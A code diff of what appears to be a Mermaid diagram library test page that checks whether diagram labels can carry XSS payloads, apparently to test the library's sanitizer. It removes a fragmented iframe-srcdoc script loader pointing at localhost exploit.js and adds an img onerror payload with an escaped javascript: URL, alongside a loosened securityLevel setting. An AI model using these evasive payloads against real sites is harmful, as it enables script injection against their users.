@@ -60,7 +60,7 @@
           // defaultRenderer: 'dagre-wrapper',
           nodeSpacing: 10, curve: 'cardinal', htmlLabels: true
         },
-        htmlLabels: false,
+        htmlLabels: true,
         // gantt: { axisFormat: '%m/%d/%Y' },
         sequence: { actorFontFamily: 'courier',actorMargin: 50, showSequenceNumbers: false },
         // sequenceDiagram: { actorMargin: 300 } // deprecated
@@ -68,23 +68,29 @@
         // fontFamily: 'courier',
         fontSize: 18,
         curve: 'basis',
-        securityLevel: 'strict',
-        startOnLoad: false
+        securityLevel: 'antiscript',
+        startOnLoad: false,
+        secure: ['secure', 'securityLevel', 'startOnLoad', 'maxTextSize']
         // themeVariables: {relationLabelColor: 'red'}
       });
       function callback(){alert('It worked');}
-
-      var diagram = "%%{init: {\"flowchart\": {\"htmlLabels\": \"false\"}} }%%\n";
-  diagram += "flowchart\n";
-  diagram += "A[\"<ifra";
-  diagram += "me srcdoc='<scrip";
-  diagram += "t src=http://localhost:9000/exploit.js>";
-  diagram += "</scr"
-  diagram += "ipt>'></iframe>\"]";
+      function xssAttack(){
+        const div = document.createElement('div')
+        div.id = 'the-malware'
+        div.className = 'malware'
+        div.innerHTML = 'XSS Succeeded'
+        document.getElementsByTagName('body')[0].appendChild(div);
+        throw new Error('XSS Succeded');
+      }
+      var diagram = "graph LR\n";
+  diagram += "B-->D\(\"<img onerror=location=\`java";
+  // diagram += "script\u003aalert\u0028document.domain\u0029\` src=x>\"\);\n";
+  diagram += "script\x3a;xssAttack\u0028\u0029\` src=x>\"\);\n";
 
   console.log(diagram);
   // document.querySelector('#diagram').innerHTML = diagram;
   mermaid.render('diagram', diagram, (res) => {
+    console.log(res);
     document.querySelector('#res').innerHTML = res;
   });
     </script>
